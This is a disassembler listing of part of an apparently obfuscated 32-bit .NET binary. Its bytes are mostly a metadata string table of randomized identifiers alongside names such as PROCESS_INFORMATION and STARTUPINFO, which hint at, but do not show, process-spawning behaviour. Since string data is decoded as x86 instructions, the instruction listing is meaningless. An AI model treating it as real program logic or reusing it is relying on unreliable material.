10002bdb:	01 2e                	add    %ebp,(%esi)
10002bdd:	00 53 00             	add    %dl,0x0(%ebx)
10002be0:	f5                   	cmc
10002be1:	01 2e                	add    %ebp,(%esi)
10002be3:	00 5b 00             	add    %bl,0x0(%ebx)
10002be6:	f5                   	cmc
10002be7:	01 2e                	add    %ebp,(%esi)
10002be9:	00 63 00             	add    %ah,0x0(%ebx)
10002bec:	13 02                	adc    (%edx),%eax
10002bee:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
10002bf2:	3d 02 2e 00 73       	cmp    $0x73002e02,%eax
10002bf7:	00 4a 02             	add    %cl,0x2(%edx)
10002bfa:	a3 00 7b 00 94       	mov    %eax,0x94007b00
10002bff:	02 c3                	add    %bl,%al
10002c01:	00 7b 00             	add    %bh,0x0(%ebx)
10002c04:	94                   	xchg   %eax,%esp
10002c05:	02 60 01             	add    0x1(%eax),%ah
10002c08:	7b 00                	jnp    0x10002c0a
10002c0a:	94                   	xchg   %eax,%esp
10002c0b:	02 80 01 7b 00 94    	add    -0x6bff84ff(%eax),%al
10002c11:	02 83 00 b4 00 f4    	add    -0xbff4c00(%ebx),%al
10002c17:	00 63 07             	add    %ah,0x7(%ebx)
10002c1a:	42                   	inc    %edx
10002c1b:	00 bb 00 d1 00 00    	add    %bh,0xd100(%ebx)
10002c21:	01 03                	add    %eax,(%ebx)
10002c23:	00 f6                	add    %dh,%dh
10002c25:	04 01                	add    $0x1,%al
10002c27:	00 40 01             	add    %al,0x1(%eax)
10002c2a:	05 00 12 09 01       	add    $0x1091200,%eax
10002c2f:	00 40 01             	add    %al,0x1(%eax)
10002c32:	07                   	pop    %es
10002c33:	00 7e 04             	add    %bh,0x4(%esi)
10002c36:	01 00                	add    %eax,(%eax)
10002c38:	40                   	inc    %eax
10002c39:	01 0b                	add    %ecx,(%ebx)
10002c3b:	00 90 04 01 00 40    	add    %dl,0x40000104(%eax)
10002c41:	01 0f                	add    %ecx,(%edi)
10002c43:	00 68 09             	add    %ch,0x9(%eax)
10002c46:	01 00                	add    %eax,(%eax)
10002c48:	40                   	inc    %eax
10002c49:	01 11                	add    %edx,(%ecx)
10002c4b:	00 b0 09 01 00 04    	add    %dh,0x4000109(%eax)
10002c51:	80 00 00             	addb   $0x0,(%eax)
10002c54:	01 00                	add    %eax,(%eax)
	...
10002c62:	3f                   	aas
10002c63:	08 00                	or     %al,(%eax)
10002c65:	00 04 00             	add    %al,(%eax,%eax,1)
	...
10002c70:	00 00                	add    %al,(%eax)
10002c72:	28 01                	sub    %al,(%ecx)
10002c74:	38 04 00             	cmp    %al,(%eax,%eax,1)
10002c77:	00 00                	add    %al,(%eax)
10002c79:	00 04 00             	add    %al,(%eax,%eax,1)
	...
10002c84:	00 00                	add    %al,(%eax)
10002c86:	28 01                	sub    %al,(%ecx)
10002c88:	a2 07 00 00 00       	mov    %al,0x7
10002c8d:	00 04 00             	add    %al,(%eax,%eax,1)
	...
10002c98:	00 00                	add    %al,(%eax)
10002c9a:	28 01                	sub    %al,(%ecx)
10002c9c:	24 05                	and    $0x5,%al
10002c9e:	00 00                	add    %al,(%eax)
10002ca0:	00 00                	add    %al,(%eax)
10002ca2:	03 00                	add    (%eax),%eax
10002ca4:	02 00                	add    (%eax),%al
10002ca6:	04 00                	add    $0x0,%al
10002ca8:	02 00                	add    (%eax),%al
10002caa:	05 00 02 00 06       	add    $0x6000200,%eax
10002caf:	00 02                	add    %al,(%edx)
10002cb1:	00 29                	add    %ch,(%ecx)
10002cb3:	00 3e                	add    %bh,(%esi)
10002cb5:	00 2d 00 67 00 2f    	add    %ch,0x2f006700
10002cbb:	00 79 00             	add    %bh,0x0(%ecx)
10002cbe:	33 00                	xor    (%eax),%eax
10002cc0:	97                   	xchg   %eax,%edi
10002cc1:	00 4d 00             	add    %cl,0x0(%ebp)
10002cc4:	3e 00 2f             	add    %ch,%ds:(%edi)
10002cc7:	00 3e                	add    %bh,(%esi)
10002cc9:	00 00                	add    %al,(%eax)
10002ccb:	00 00                	add    %al,(%eax)
10002ccd:	43                   	inc    %ebx
10002cce:	57                   	push   %edi
10002ccf:	65 6d                	gs insl (%dx),%es:(%edi)
10002cd1:	46                   	inc    %esi
10002cd2:	54                   	push   %esp
10002cd3:	59                   	pop    %ecx
10002cd4:	67 68 53 72 34 62    	addr16 push $0x62347253
10002cda:	37                   	aaa
10002cdb:	41                   	inc    %ecx
10002cdc:	59                   	pop    %ecx
10002cdd:	6e                   	outsb  %ds:(%esi),(%dx)
10002cde:	30 50 39             	xor    %dl,0x39(%eax)
10002ce1:	30 00                	xor    %al,(%eax)
10002ce3:	58                   	pop    %eax
10002ce4:	55                   	push   %ebp
10002ce5:	55                   	push   %ebp
10002ce6:	4b                   	dec    %ebx
10002ce7:	57                   	push   %edi
10002ce8:	63 74 4f 30          	arpl   %esi,0x30(%edi,%ecx,2)
10002cec:	69 45 4d 79 57 59 6e 	imul   $0x6e595779,0x4d(%ebp),%eax
10002cf3:	64 55                	fs push %ebp
10002cf5:	30 00                	xor    %al,(%eax)
10002cf7:	47                   	inc    %edi
10002cf8:	42                   	inc    %edx
10002cf9:	5a                   	pop    %edx
10002cfa:	4c                   	dec    %esp
10002cfb:	70 42                	jo     0x10002d3f
10002cfd:	31 45 6f             	xor    %eax,0x6f(%ebp)
10002d00:	6b 79 4d 77          	imul   $0x77,0x4d(%ecx),%edi
10002d04:	52                   	push   %edx
10002d05:	5a                   	pop    %edx
10002d06:	4e                   	dec    %esi
10002d07:	6e                   	outsb  %ds:(%esi),(%dx)
10002d08:	4c                   	dec    %esp
10002d09:	63 58 66             	arpl   %ebx,0x66(%eax)
10002d0c:	5a                   	pop    %edx
10002d0d:	58                   	pop    %eax
10002d0e:	30 00                	xor    %al,(%eax)
10002d10:	3c 3e                	cmp    $0x3e,%al
10002d12:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
10002d15:	44                   	inc    %esp
10002d16:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
10002d1d:	6c                   	insb   (%dx),%es:(%edi)
10002d1e:	61                   	popa
10002d1f:	73 73                	jae    0x10002d94
10002d21:	31 30                	xor    %esi,(%eax)
10002d23:	5f                   	pop    %edi
10002d24:	30 00                	xor    %al,(%eax)
10002d26:	3c 45                	cmp    $0x45,%al
10002d28:	42                   	inc    %edx
10002d29:	4e                   	dec    %esi
10002d2a:	77 6f                	ja     0x10002d9b
10002d2c:	56                   	push   %esi
10002d2d:	59                   	pop    %ecx
10002d2e:	73 76                	jae    0x10002da6
10002d30:	69 68 69 51 44 52 47 	imul   $0x47524451,0x69(%eax),%ebp
10002d37:	74 4d                	je     0x10002d86
10002d39:	57                   	push   %edi
10002d3a:	41                   	inc    %ecx
10002d3b:	62 71 3e             	bound  %esi,0x3e(%ecx)
10002d3e:	67 5f                	addr16 pop %edi
10002d40:	5f                   	pop    %edi
10002d41:	42                   	inc    %edx
10002d42:	66 66 4d             	data16 dec %bp
10002d45:	41                   	inc    %ecx
10002d46:	4d                   	dec    %ebp
10002d47:	46                   	inc    %esi
10002d48:	61                   	popa
10002d49:	61                   	popa
10002d4a:	71 76                	jno    0x10002dc2
10002d4c:	7a 4f                	jp     0x10002d9d
10002d4e:	46                   	inc    %esi
10002d4f:	7c 31                	jl     0x10002d82
10002d51:	30 5f 30             	xor    %bl,0x30(%edi)
10002d54:	00 3c 3e             	add    %bh,(%esi,%edi,1)
10002d57:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
10002d5a:	35 5f 30 00 3c       	xor    $0x3c00305f,%eax
10002d5f:	48                   	dec    %eax
10002d60:	56                   	push   %esi
10002d61:	6b 4e 73 79          	imul   $0x79,0x73(%esi),%ecx
10002d65:	56                   	push   %esi
10002d66:	69 7a 71 67 4e 6e 65 	imul   $0x656e4e67,0x71(%edx),%edi
10002d6d:	57                   	push   %edi
10002d6e:	58                   	pop    %eax
10002d6f:	79 75                	jns    0x10002de6
10002d71:	4f                   	dec    %edi
10002d72:	47                   	inc    %edi
10002d73:	70 53                	jo     0x10002dc8
10002d75:	38 3e                	cmp    %bh,(%esi)
10002d77:	62 5f 5f             	bound  %ebx,0x5f(%edi)
10002d7a:	35 5f 30 00 3c       	xor    $0x3c00305f,%eax
10002d7f:	3e 39 5f 5f          	cmp    %ebx,%ds:0x5f(%edi)
10002d83:	37                   	aaa
10002d84:	5f                   	pop    %edi
10002d85:	30 00                	xor    %al,(%eax)
10002d87:	3c 56                	cmp    $0x56,%al
10002d89:	65 74 59             	gs je  0x10002de5
10002d8c:	68 44 5a 44 6d       	push   $0x6d445a44
10002d91:	4d                   	dec    %ebp
10002d92:	6e                   	outsb  %ds:(%esi),(%dx)
10002d93:	7a 4d                	jp     0x10002de2
10002d95:	4a                   	dec    %edx
10002d96:	66 63 39             	arpl   %di,(%ecx)
10002d99:	55                   	push   %ebp
10002d9a:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
10002d9e:	37                   	aaa
10002d9f:	5f                   	pop    %edi
10002da0:	30 00                	xor    %al,(%eax)
10002da2:	4a                   	dec    %edx
10002da3:	4d                   	dec    %ebp
10002da4:	68 6e 49 6a 79       	push   $0x796a496e
10002da9:	6a 55                	push   $0x55
10002dab:	67 76 74             	addr16 jbe 0x10002e22
10002dae:	44                   	inc    %esp
10002daf:	46                   	inc    %esi
10002db0:	45                   	inc    %ebp
10002db1:	5a                   	pop    %edx
10002db2:	61                   	popa
10002db3:	44                   	inc    %esp
10002db4:	43                   	inc    %ebx
10002db5:	31 00                	xor    %eax,(%eax)
10002db7:	3c 45                	cmp    $0x45,%al
10002db9:	42                   	inc    %edx
10002dba:	4e                   	dec    %esi
10002dbb:	77 6f                	ja     0x10002e2c
10002dbd:	56                   	push   %esi
10002dbe:	59                   	pop    %ecx
10002dbf:	73 76                	jae    0x10002e37
10002dc1:	69 68 69 51 44 52 47 	imul   $0x47524451,0x69(%eax),%ebp
10002dc8:	74 4d                	je     0x10002e17
10002dca:	57                   	push   %edi
10002dcb:	41                   	inc    %ecx
10002dcc:	62 71 3e             	bound  %esi,0x3e(%ecx)
10002dcf:	67 5f                	addr16 pop %edi
10002dd1:	5f                   	pop    %edi
10002dd2:	58                   	pop    %eax
10002dd3:	57                   	push   %edi
10002dd4:	59                   	pop    %ecx
10002dd5:	62 5a 49             	bound  %ebx,0x49(%edx)
10002dd8:	56                   	push   %esi
10002dd9:	47                   	inc    %edi
10002dda:	38 4a 48             	cmp    %cl,0x48(%edx)
10002ddd:	67 78 5a             	addr16 js 0x10002e3a
10002de0:	6b 44 57 34 7c       	imul   $0x7c,0x34(%edi,%edx,2),%eax
10002de5:	31 30                	xor    %esi,(%eax)
10002de7:	5f                   	pop    %edi
10002de8:	31 00                	xor    %eax,(%eax)
10002dea:	49                   	dec    %ecx
10002deb:	45                   	inc    %ebp
10002dec:	6e                   	outsb  %ds:(%esi),(%dx)
10002ded:	75 6d                	jne    0x10002e5c
10002def:	65 72 61             	gs jb  0x10002e53
10002df2:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
10002df6:	31 00                	xor    %eax,(%eax)
10002df8:	4c                   	dec    %esp
10002df9:	69 73 74 60 31 00 49 	imul   $0x49003160,0x74(%ebx),%esi
10002e00:	79 65                	jns    0x10002e67
10002e02:	4e                   	dec    %esi
10002e03:	72 7a                	jb     0x10002e7f
10002e05:	37                   	aaa
10002e06:	53                   	push   %ebx
10002e07:	6e                   	outsb  %ds:(%esi),(%dx)
10002e08:	6d                   	insl   (%dx),%es:(%edi)
10002e09:	49                   	dec    %ecx
10002e0a:	61                   	popa
10002e0b:	4b                   	dec    %ebx
10002e0c:	32 00                	xor    (%eax),%al
10002e0e:	4c                   	dec    %esp
10002e0f:	61                   	popa
10002e10:	61                   	popa
10002e11:	66 7a 76             	data16 jp 0x10002e8a
10002e14:	36 4b                	ss dec %ebx
10002e16:	4e                   	dec    %esi
10002e17:	68 4f 76 4b 4a       	push   $0x4a4b764f
10002e1c:	52                   	push   %edx
10002e1d:	33 50 32             	xor    0x32(%eax),%edx
10002e20:	00 3c 45 42 4e 77 6f 	add    %bh,0x6f774e42(,%eax,2)
10002e27:	56                   	push   %esi
10002e28:	59                   	pop    %ecx
10002e29:	73 76                	jae    0x10002ea1
10002e2b:	69 68 69 51 44 52 47 	imul   $0x47524451,0x69(%eax),%ebp
10002e32:	74 4d                	je     0x10002e81
10002e34:	57                   	push   %edi
10002e35:	41                   	inc    %ecx
10002e36:	62 71 3e             	bound  %esi,0x3e(%ecx)
10002e39:	62 5f 5f             	bound  %ebx,0x5f(%edi)
10002e3c:	32 00                	xor    (%eax),%al
10002e3e:	46                   	inc    %esi
10002e3f:	75 6e                	jne    0x10002eaf
10002e41:	63 60 32             	arpl   %esp,0x32(%eax)
10002e44:	00 44 66 41          	add    %al,0x41(%esi,%eiz,2)
10002e48:	62 74 4d 6b          	bound  %esi,0x6b(%ebp,%ecx,2)
10002e4c:	5a                   	pop    %edx
10002e4d:	35 49 79 73 49       	xor    $0x49737949,%eax
10002e52:	79 51                	jns    0x10002ea5
10002e54:	6c                   	insb   (%dx),%es:(%edi)
10002e55:	46                   	inc    %esi
10002e56:	30 79 4a             	xor    %bh,0x4a(%ecx)
10002e59:	6d                   	insl   (%dx),%es:(%edi)
10002e5a:	32 00                	xor    (%eax),%al
10002e5c:	52                   	push   %edx
10002e5d:	41                   	inc    %ecx
10002e5e:	4e                   	dec    %esi
10002e5f:	45                   	inc    %ebp
10002e60:	43                   	inc    %ebx
10002e61:	73 52                	jae    0x10002eb5
10002e63:	35 4a 4e 72 4d       	xor    $0x4d724e4a,%eax
10002e68:	65 55                	gs push %ebp
10002e6a:	53                   	push   %ebx
10002e6b:	71 6a                	jno    0x10002ed7
10002e6d:	64 7a 32             	fs jp  0x10002ea2
10002e70:	00 53 65             	add    %dl,0x65(%ebx)
10002e73:	75 4d                	jne    0x10002ec2
10002e75:	4f                   	dec    %edi
10002e76:	4f                   	dec    %edi
10002e77:	62 30                	bound  %esi,(%eax)
10002e79:	31 77 37             	xor    %esi,0x37(%edi)
10002e7c:	47                   	inc    %edi
10002e7d:	52                   	push   %edx
10002e7e:	35 48 50 43 6b       	xor    $0x6b435048,%eax
10002e83:	31 4f 46             	xor    %ecx,0x46(%edi)
10002e86:	4f                   	dec    %edi
10002e87:	34 00                	xor    $0x0,%al
10002e89:	49                   	dec    %ecx
10002e8a:	69 58 44 47 49 4b 6b 	imul   $0x6b4b4947,0x44(%eax),%ebx
10002e91:	65 48                	gs dec %eax
10002e93:	74 66                	je     0x10002efb
10002e95:	73 7a                	jae    0x10002f11
10002e97:	34 00                	xor    $0x0,%al
10002e99:	51                   	push   %ecx
10002e9a:	6a 58                	push   $0x58
10002e9c:	65 70 65             	gs jo  0x10002f04
10002e9f:	54                   	push   %esp
10002ea0:	46                   	inc    %esi
10002ea1:	6f                   	outsl  %ds:(%esi),(%dx)
10002ea2:	6d                   	insl   (%dx),%es:(%edi)
10002ea3:	33 36                	xor    (%esi),%esi
10002ea5:	49                   	dec    %ecx
10002ea6:	70 42                	jo     0x10002eea
10002ea8:	50                   	push   %eax
10002ea9:	70 7a                	jo     0x10002f25
10002eab:	73 59                	jae    0x10002f06
10002ead:	66 35 00 44          	xor    $0x4400,%ax
10002eb1:	49                   	dec    %ecx
10002eb2:	6c                   	insb   (%dx),%es:(%edi)
10002eb3:	71 4e                	jno    0x10002f03
10002eb5:	4b                   	dec    %ebx
10002eb6:	70 63                	jo     0x10002f1b
10002eb8:	4f                   	dec    %edi
10002eb9:	4f                   	dec    %edi
10002eba:	45                   	inc    %ebp
10002ebb:	65 31 62 57          	xor    %esp,%gs:0x57(%edx)
10002ebf:	57                   	push   %edi
10002ec0:	47                   	inc    %edi
10002ec1:	6a 64                	push   $0x64
10002ec3:	36 00 67 65          	add    %ah,%ss:0x65(%edi)
10002ec7:	74 5f                	je     0x10002f28
10002ec9:	55                   	push   %ebp
10002eca:	54                   	push   %esp
10002ecb:	46                   	inc    %esi
10002ecc:	38 00                	cmp    %al,(%eax)
10002ece:	48                   	dec    %eax
10002ecf:	56                   	push   %esi
10002ed0:	6b 4e 73 79          	imul   $0x79,0x73(%esi),%ecx
10002ed4:	56                   	push   %esi
10002ed5:	69 7a 71 67 4e 6e 65 	imul   $0x656e4e67,0x71(%edx),%edi
10002edc:	57                   	push   %edi
10002edd:	58                   	pop    %eax
10002ede:	79 75                	jns    0x10002f55
10002ee0:	4f                   	dec    %edi
10002ee1:	47                   	inc    %edi
10002ee2:	70 53                	jo     0x10002f37
10002ee4:	38 00                	cmp    %al,(%eax)
10002ee6:	3c 3e                	cmp    $0x3e,%al
10002ee8:	39 00                	cmp    %eax,(%eax)
10002eea:	3c 4d                	cmp    $0x4d,%al
10002eec:	6f                   	outsl  %ds:(%esi),(%dx)
10002eed:	64 75 6c             	fs jne 0x10002f5c
10002ef0:	65 3e 00 55 4a       	gs add %dl,%ds:0x4a(%ebp)
10002ef5:	73 55                	jae    0x10002f4c
10002ef7:	76 66                	jbe    0x10002f5f
10002ef9:	4c                   	dec    %esp
10002efa:	6c                   	insb   (%dx),%es:(%edi)
10002efb:	56                   	push   %esi
10002efc:	6d                   	insl   (%dx),%es:(%edi)
10002efd:	4e                   	dec    %esi
10002efe:	79 7a                	jns    0x10002f7a
10002f00:	54                   	push   %esp
10002f01:	41                   	inc    %ecx
10002f02:	00 48 71             	add    %cl,0x71(%eax)
10002f05:	5a                   	pop    %edx
10002f06:	75 48                	jne    0x10002f50
10002f08:	59                   	pop    %ecx
10002f09:	72 53                	jb     0x10002f5e
10002f0b:	41                   	inc    %ecx
10002f0c:	7a 58                	jp     0x10002f66
10002f0e:	4b                   	dec    %ebx
10002f0f:	6f                   	outsl  %ds:(%esi),(%dx)
10002f10:	61                   	popa
10002f11:	41                   	inc    %ecx
10002f12:	72 4f                	jb     0x10002f63
10002f14:	42                   	inc    %edx
10002f15:	42                   	inc    %edx
10002f16:	00 41 4c             	add    %al,0x4c(%ecx)
10002f19:	4d                   	dec    %ebp
10002f1a:	46                   	inc    %esi
10002f1b:	72 50                	jb     0x10002f6d
10002f1d:	72 61                	jb     0x10002f80
10002f1f:	51                   	push   %ecx
10002f20:	5a                   	pop    %edx
10002f21:	73 63                	jae    0x10002f86
10002f23:	46                   	inc    %esi
10002f24:	37                   	aaa
10002f25:	66 42                	inc    %dx
10002f27:	00 43 77             	add    %al,0x77(%ebx)
10002f2a:	79 54                	jns    0x10002f80
10002f2c:	73 42                	jae    0x10002f70
10002f2e:	39 52 36             	cmp    %edx,0x36(%edx)
10002f31:	71 79                	jno    0x10002fac
10002f33:	41                   	inc    %ecx
10002f34:	6e                   	outsb  %ds:(%esi),(%dx)
10002f35:	35 69 5a 6e 55       	xor    $0x556e5a69,%eax
10002f3a:	6e                   	outsb  %ds:(%esi),(%dx)
10002f3b:	32 6b 42             	xor    0x42(%ebx),%ch
10002f3e:	00 55 51             	add    %dl,0x51(%ebp)
10002f41:	6a 4b                	push   $0x4b
10002f43:	57                   	push   %edi
10002f44:	67 67 53             	addr16 addr16 push %ebx
10002f47:	35 58 4e 4f 57       	xor    $0x574f4e58,%eax
10002f4c:	62 34 58             	bound  %esi,(%eax,%ebx,2)
10002f4f:	78 6a                	js     0x10002fbb
10002f51:	45                   	inc    %ebp
10002f52:	43                   	inc    %ebx
10002f53:	00 54 41 45          	add    %dl,0x45(%ecx,%eax,2)
10002f57:	71 59                	jno    0x10002fb2
10002f59:	47                   	inc    %edi
10002f5a:	57                   	push   %edi
10002f5b:	67 37                	addr16 aaa
10002f5d:	4f                   	dec    %edi
10002f5e:	6a 46                	push   $0x46
10002f60:	58                   	pop    %eax
10002f61:	66 49                	dec    %cx
10002f63:	37                   	aaa
10002f64:	78 6c                	js     0x10002fd2
10002f66:	6a 44                	push   $0x44
10002f68:	00 55 50             	add    %dl,0x50(%ebp)
10002f6b:	64 50                	fs push %eax
10002f6d:	4c                   	dec    %esp
10002f6e:	41                   	inc    %ecx
10002f6f:	44                   	inc    %esp
10002f70:	52                   	push   %edx
10002f71:	70 76                	jo     0x10002fe9
10002f73:	75 54                	jne    0x10002fc9
10002f75:	32 68 53             	xor    0x53(%eax),%ch
10002f78:	49                   	dec    %ecx
10002f79:	6f                   	outsl  %ds:(%esi),(%dx)
10002f7a:	55                   	push   %ebp
10002f7b:	6e                   	outsb  %ds:(%esi),(%dx)
10002f7c:	48                   	dec    %eax
10002f7d:	38 71 4a             	cmp    %dh,0x4a(%ecx)
10002f80:	45                   	inc    %ebp
10002f81:	00 52 55             	add    %dl,0x55(%edx)
10002f84:	75 6c                	jne    0x10002ff2
10002f86:	68 47 52 41 63       	push   $0x63415247
10002f8b:	70 4a                	jo     0x10002fd7
10002f8d:	6e                   	outsb  %ds:(%esi),(%dx)
10002f8e:	4c                   	dec    %esp
10002f8f:	69 38 58 75 4d 65    	imul   $0x654d7558,(%eax),%edi
10002f95:	57                   	push   %edi
10002f96:	46                   	inc    %esi
10002f97:	00 42 6a             	add    %al,0x6a(%edx)
10002f9a:	7a 59                	jp     0x10002ff5
10002f9c:	77 5a                	ja     0x10002ff8
10002f9e:	6d                   	insl   (%dx),%es:(%edi)
10002f9f:	43                   	inc    %ebx
10002fa0:	43                   	inc    %ebx
10002fa1:	4d                   	dec    %ebp
10002fa2:	64 72 71             	fs jb  0x10003016
10002fa5:	5a                   	pop    %edx
10002fa6:	6c                   	insb   (%dx),%es:(%edi)
10002fa7:	52                   	push   %edx
10002fa8:	72 39                	jb     0x10002fe3
10002faa:	55                   	push   %ebp
10002fab:	59                   	pop    %ecx
10002fac:	49                   	dec    %ecx
10002fad:	00 44 61 63          	add    %al,0x63(%ecx,%eiz,2)
10002fb1:	70 43                	jo     0x10002ff6
10002fb3:	48                   	dec    %eax
10002fb4:	51                   	push   %ecx
10002fb5:	64 64 77 66          	fs fs ja 0x1000301f
10002fb9:	76 79                	jbe    0x10003034
10002fbb:	43                   	inc    %ebx
10002fbc:	30 73 6d             	xor    %dh,0x6d(%ebx)
10002fbf:	38 49 4a             	cmp    %cl,0x4a(%ecx)
10002fc2:	00 57 44             	add    %dl,0x44(%edi)
10002fc5:	6e                   	outsb  %ds:(%esi),(%dx)
10002fc6:	67 72 70             	addr16 jb 0x10003039
10002fc9:	5a                   	pop    %edx
10002fca:	51                   	push   %ecx
10002fcb:	57                   	push   %edi
10002fcc:	6e                   	outsb  %ds:(%esi),(%dx)
10002fcd:	72 52                	jb     0x10003021
10002fcf:	36 4b                	ss dec %ebx
10002fd1:	00 44 73 74          	add    %al,0x74(%ebx,%esi,2)
10002fd5:	45                   	inc    %ebp
10002fd6:	77 79                	ja     0x10003051
10002fd8:	31 68 34             	xor    %ebp,0x34(%eax)
10002fdb:	6d                   	insl   (%dx),%es:(%edi)
10002fdc:	59                   	pop    %ecx
10002fdd:	48                   	dec    %eax
10002fde:	62 6f 7a             	bound  %ebp,0x7a(%edi)
10002fe1:	70 39                	jo     0x1000301c
10002fe3:	58                   	pop    %eax
10002fe4:	31 5a 39             	xor    %ebx,0x39(%edx)
10002fe7:	4c                   	dec    %esp
10002fe8:	00 4b 70             	add    %cl,0x70(%ebx)
10002feb:	58                   	pop    %eax
10002fec:	74 57                	je     0x10003045
10002fee:	46                   	inc    %esi
10002fef:	64 67 32 47 56       	xor    %fs:0x56(%bx),%al
10002ff4:	6d                   	insl   (%dx),%es:(%edi)
10002ff5:	44                   	inc    %esp
10002ff6:	41                   	inc    %ecx
10002ff7:	52                   	push   %edx
10002ff8:	41                   	inc    %ecx
10002ff9:	57                   	push   %edi
10002ffa:	4c                   	dec    %esp
10002ffb:	00 59 69             	add    %bl,0x69(%ecx)
10002ffe:	6b 75 76 6e          	imul   $0x6e,0x76(%ebp),%esi
10003002:	6b 4f 68 52          	imul   $0x52,0x68(%edi),%ecx
10003006:	34 46                	xor    $0x46,%al
10003008:	79 56                	jns    0x10003060
1000300a:	39 57 55             	cmp    %edx,0x55(%edi)
1000300d:	41                   	inc    %ecx
1000300e:	46                   	inc    %esi
1000300f:	4e                   	dec    %esi
10003010:	00 50 52             	add    %dl,0x52(%eax)
10003013:	4f                   	dec    %edi
10003014:	43                   	inc    %ebx
10003015:	45                   	inc    %ebp
10003016:	53                   	push   %ebx
10003017:	53                   	push   %ebx
10003018:	5f                   	pop    %edi
10003019:	49                   	dec    %ecx
1000301a:	4e                   	dec    %esi
1000301b:	46                   	inc    %esi
1000301c:	4f                   	dec    %edi
1000301d:	52                   	push   %edx
1000301e:	4d                   	dec    %ebp
1000301f:	41                   	inc    %ecx
10003020:	54                   	push   %esp
10003021:	49                   	dec    %ecx
10003022:	4f                   	dec    %edi
10003023:	4e                   	dec    %esi
10003024:	00 53 54             	add    %dl,0x54(%ebx)
10003027:	41                   	inc    %ecx
10003028:	52                   	push   %edx
10003029:	54                   	push   %esp
1000302a:	55                   	push   %ebp
1000302b:	50                   	push   %eax
1000302c:	49                   	dec    %ecx
1000302d:	4e                   	dec    %esi
1000302e:	46                   	inc    %esi
1000302f:	4f                   	dec    %edi
10003030:	00 53 79             	add    %dl,0x79(%ebx)
10003033:	73 74                	jae    0x100030a9
10003035:	65 6d                	gs insl (%dx),%es:(%edi)
10003037:	2e 49                	cs dec %ecx
10003039:	4f                   	dec    %edi
1000303a:	00 57 79             	add    %dl,0x79(%edi)
1000303d:	4e                   	dec    %esi
1000303e:	73 63                	jae    0x100030a3
10003040:	79 68                	jns    0x100030aa
10003042:	4a                   	dec    %edx
10003043:	79 39                	jns    0x1000307e
10003045:	38 7a 30             	cmp    %bh,0x30(%edx)
10003048:	46                   	inc    %esi
10003049:	58                   	pop    %eax
1000304a:	55                   	push   %ebp
1000304b:	69 68 66 48 59 52 4f 	imul   $0x4f525948,0x66(%eax),%ebp
10003052:	00 44 69 51          	add    %al,0x51(%ecx,%ebp,2)
10003056:	6b 54 46 35 6a       	imul   $0x6a,0x35(%esi,%eax,2),%edx
1000305b:	62 68 75             	bound  %ebp,0x75(%eax)
1000305e:	35 59 36 51 56       	xor    $0x56513659,%eax
10003063:	47                   	inc    %edi
10003064:	50                   	push   %eax
10003065:	00 52 64             	add    %dl,0x64(%edx)
10003068:	42                   	inc    %edx
10003069:	6f                   	outsl  %ds:(%esi),(%dx)
1000306a:	4a                   	dec    %edx
1000306b:	6e                   	outsb  %ds:(%esi),(%dx)
1000306c:	61                   	popa
1000306d:	50                   	push   %eax
1000306e:	53                   	push   %ebx
1000306f:	6a 68                	push   $0x68
10003071:	50                   	push   %eax
10003072:	6b 61 75 66          	imul   $0x66,0x75(%ecx),%esp
10003076:	4c                   	dec    %esp
10003077:	77 4f                	ja     0x100030c8
10003079:	37                   	aaa
1000307a:	52                   	push   %edx
1000307b:	59                   	pop    %ecx
1000307c:	43                   	inc    %ebx
1000307d:	51                   	push   %ecx
1000307e:	00 5a 65             	add    %bl,0x65(%edx)
10003081:	69 6f 62 77 73 53 61 	imul   $0x61537377,0x62(%edi),%ebp
10003088:	77 79                	ja     0x10003103
1000308a:	5a                   	pop    %edx
1000308b:	37                   	aaa
1000308c:	58                   	pop    %eax
1000308d:	64 52                	fs push %edx
1000308f:	44                   	inc    %esp
10003090:	63 51 00             	arpl   %edx,0x0(%ecx)
10003093:	42                   	inc    %edx
10003094:	4a                   	dec    %edx
10003095:	6c                   	insb   (%dx),%es:(%edi)
10003096:	76 70                	jbe    0x10003108
10003098:	4b                   	dec    %ebx
10003099:	57                   	push   %edi
1000309a:	6c                   	insb   (%dx),%es:(%edi)
1000309b:	66 5a                	pop    %dx
1000309d:	72 4a                	jb     0x100030e9
1000309f:	52                   	push   %edx
100030a0:	30 4e 67             	xor    %cl,0x67(%esi)
100030a3:	32 36                	xor    (%esi),%dh
100030a5:	67 44                	addr16 inc %esp
100030a7:	7a 78                	jp     0x10003121
100030a9:	44                   	inc    %esp
100030aa:	52                   	push   %edx
100030ab:	00 43 71             	add    %al,0x71(%ebx)
100030ae:	4c                   	dec    %esp
100030af:	41                   	inc    %ecx
100030b0:	66 58                	pop    %ax
100030b2:	7a 44                	jp     0x100030f8
100030b4:	55                   	push   %ebp
100030b5:	49                   	dec    %ecx
100030b6:	4f                   	dec    %edi
100030b7:	50                   	push   %eax
100030b8:	64 31 48 54          	xor    %ecx,%fs:0x54(%eax)
100030bc:	00 56 65             	add    %dl,0x65(%esi)
100030bf:	74 59                	je     0x1000311a
100030c1:	68 44 5a 44 6d       	push   $0x6d445a44
100030c6:	4d                   	dec    %ebp
100030c7:	6e                   	outsb  %ds:(%esi),(%dx)
100030c8:	7a 4d                	jp     0x10003117
100030ca:	4a                   	dec    %edx
100030cb:	66 63 39             	arpl   %di,(%ecx)
100030ce:	55                   	push   %ebp
100030cf:	00 51 6c             	add    %dl,0x6c(%ecx)
100030d2:	69 6c 52 56 7a 47 55 	imul   $0x5655477a,0x56(%edx,%edx,2),%ebp
100030d9:	56 
100030da:	63 42 66             	arpl   %eax,0x66(%edx)
100030dd:	5a                   	pop    %edx
100030de:	58                   	pop    %eax
100030df:	00 64 77 58          	add    %ah,0x58(%edi,%esi,2)
100030e3:	00 64 77 59          	add    %ah,0x59(%edi,%esi,2)
100030e7:	00 54 47 61          	add    %dl,0x61(%edi,%eax,2)
100030eb:	46                   	inc    %esi
100030ec:	66 44                	inc    %sp
100030ee:	71 72                	jno    0x10003162
100030f0:	50                   	push   %eax
100030f1:	75 67                	jne    0x1000315a
100030f3:	52                   	push   %edx
100030f4:	68 66 68 71 31       	push   $0x31716866
100030f9:	71 48                	jno    0x10003143
100030fb:	62 71 68             	bound  %esi,0x68(%ecx)
100030fe:	47                   	inc    %edi
100030ff:	62 00                	bound  %eax,(%eax)
